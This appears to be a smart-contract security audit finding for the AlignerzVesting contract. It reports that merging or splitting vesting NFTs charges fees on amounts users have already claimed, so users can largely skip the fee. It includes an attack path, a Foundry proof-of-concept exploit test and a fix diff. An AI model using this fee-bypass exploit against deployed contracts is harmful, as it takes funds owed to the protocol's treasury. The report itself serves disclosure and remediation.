# [000103] Merging or splitting TVS subtracts fees wrong, allowing users to bypass the fee
  
  ### Summary

In function [`mergeTVS`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1002), fees are taken from all of the NFTs being merged together. The problem is that it does not care for a TVS that is already almost fully claimed, allowing users to bypass the fee almost completely.
```solidity
    function _merge(Allocation storage mergedTVS, uint256 projectId, uint256 nftId, IERC20 token)
        internal
        returns (uint256 feeAmount)
    {
            ...
            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
@>            mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
            ...
```
The same problem appears in [`splitTVS`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1054) when calculating the fee from the `splitNftId`.
```solidity
    function splitTVS(uint256 projectId, uint256[] calldata percentages, uint256 splitNftId)
        external
        returns (uint256, uint256[] memory)
    {
        ...
        uint256 nbOfFlows = allocation.amounts.length;
        (uint256 feeAmount, uint256[] memory newAmounts) =
            calculateFeeAndNewAmountForOneTVS_correct(splitFeeRate, amounts, nbOfFlows);
        allocation.amounts = newAmounts;
        token.safeTransfer(treasury, feeAmount);
        ...
```

### Root Cause

Function [`mergeTVS`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1002) subtracts the fee from the full `TVSToMerge.amounts[j]`, by doing:
```solidity
            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
            mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
```
This exact subtraction should only be done if `TVSToMerge.claimedSeconds[j] == 0` (the user has not claimed anything from that TVS). If `TVSToMerge.claimedSeconds[j] > 0`, then the fee should be taken from the user directly.

### Internal Pre-conditions

1. User has not claimed the TVS/TVSs fully.

### External Pre-conditions

None

### Attack Path

1. Reward project is launched and user has a TVS claimed in it.
2. He claims almost all of the tokens by calling [`claimTokens`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L941) right before the end of the vesting period.
3. Another reward project is launched and user has a TVS claimed in it.
4. He does the same thing as before and claims right before the end of the vesting period.
5. User calls `mergeTVS` and merges the 2 TVS together and bypasses the fee almost fully for both the TVSs.

### Impact

The problem this brings is that by calculating the fee from the full `TVSToMerge.amounts[j]`, if the user has already claimed a lot of the TVS, he will bypass the fee, since he has already claimed for the full amount almost all of it.
This fee bypass can be a lot. For example in the PoC i have given below, the fee transfered to the `treasury` from the user accounting is `20e18`, but the actual fee taken from the user is `0.7e18`. 

### PoC

To compile this test you need to:
1. In the `setUp` function in `AlignerzVestingProtocolTest` set the treasury to another address:
```solidity
        address treasury = makeAddr("treasury");
        vesting.setTreasury(treasury);
```
2. Add the correct `calculateFeeAndNewAmountForOneTVS` function in the `FeesManager` contract, since it normally reverts:
```solidity
    function calculateFeeAndNewAmountForOneTVS_correct(uint256 feeRate, uint256[] memory amounts, uint256 length)
        public
        pure
        returns (uint256 feeAmount, uint256[] memory newAmounts)
    {
        newAmounts = new uint256[](length);
        for (uint256 i; i < length;) {
            feeAmount += calculateFeeAmount(feeRate, amounts[i]);
            newAmounts[i] = amounts[i] - feeAmount;
            unchecked {
                ++i;
            }
        }
    }
```
And change it in the `mergeTVS` function :
```solidity
     ...
        (uint256 feeAmount, uint256[] memory newAmounts) =
            calculateFeeAndNewAmountForOneTVS_correct(mergeFeeRate, amounts, nbOfFlows);
     ...
```
Now add this test in the test suite:
```solidity
    function test_PoC_UserBypassMergingFees() public {
        vm.startPrank(projectCreator);
        // launch both projects to have 2 TVS for kol
        vesting.launchRewardProject(address(token), address(usdt), block.timestamp, 1);
        vesting.launchRewardProject(address(token), address(usdt), block.timestamp, 1);
        vesting.setMergeFeeRate(100);
        vesting.setSplitFeeRate(100);

        address[] memory kols = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            kols[i] = address(uint160(i + 1));
        }

        uint256[] memory amounts = new uint256[](10);
        for (uint256 i = 0; i < 10; i++) {
            amounts[i] = 1_000e18;
        }

        // set TVS allocation for project 0
        vesting.setTVSAllocation(0, 10_000e18, 30 days, kols, amounts);
        address[] memory attacker = new address[](1);
        attacker[0] = kols[0];
        uint256[] memory amount = new uint256[](1);
        amount[0] = 1_000e18;
        // set TVS allocation for project 1
        vesting.setTVSAllocation(1, 1_000e18, 30 days, attacker, amount);
        vm.stopPrank();

        // claim TVS for all user
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(kols[i]);
            vesting.claimRewardTVS(0);
        }

        vm.startPrank(kols[0]);
        vesting.claimRewardTVS(1);

        // skip to 1 day before vesting period ends
        vm.warp(block.timestamp + 29 days);

        nft.setApprovalForAll(address(vesting), true);
        // user claims for both TVS
        vesting.claimTokens(0, 1);
        vesting.claimTokens(1, 11);
        console2.log("Tokens claimed before merging from both TVSs: ", token.balanceOf(kols[0]));

        uint256[] memory projectIds = new uint256[](1);
        uint256[] memory nftIds = new uint256[](1);
        projectIds[0] = 1;
        nftIds[0] = 11;

        // user merges TVSs
        uint256 vestingBalanceBefore = token.balanceOf(address(vesting));
        vesting.mergeTVS(0, 1, projectIds, nftIds);
        uint256 vestingBalanceAfter = token.balanceOf(address(vesting));
        console2.log("Fee sent to the treasury after merge: ", vestingBalanceBefore - vestingBalanceAfter);

        // skip to the end of the vesting period
        vm.warp(block.timestamp + 2 days);

        // user claims the full TVS bypassing the fee
        vesting.claimTokens(0, 1);
        uint256 kolBalance = token.balanceOf(kols[0]);
        console2.log("Balance of KOL after claiming fully and bypassing the full 20e18 fee: ", kolBalance);

        vm.stopPrank();
    }
```

### Mitigation

Change it to this:
```diff
+        for (uint256 j = 0; j < nbOfFlowsTVSToMerge; j++) {
+            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
+            if (TVSToMerge.claimedSeconds[j] == 0) {
+                mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
+                feeAmount += fee;
+            } else {
+                mergedTVS.amounts.push(TVSToMerge.amounts[j]);
+                token.safeTransferFrom(msg.sender, treasury, fee);
+            }
+            mergedTVS.vestingPeriods.push(TVSToMerge.vestingPeriods[j]);
+            mergedTVS.vestingStartTimes.push(TVSToMerge.vestingStartTimes[j]);
+            mergedTVS.claimedSeconds.push(TVSToMerge.claimedSeconds[j]);
+            mergedTVS.claimedFlows.push(TVSToMerge.claimedFlows[j]);
+        }
```
Do the same for `splitTVS`.
  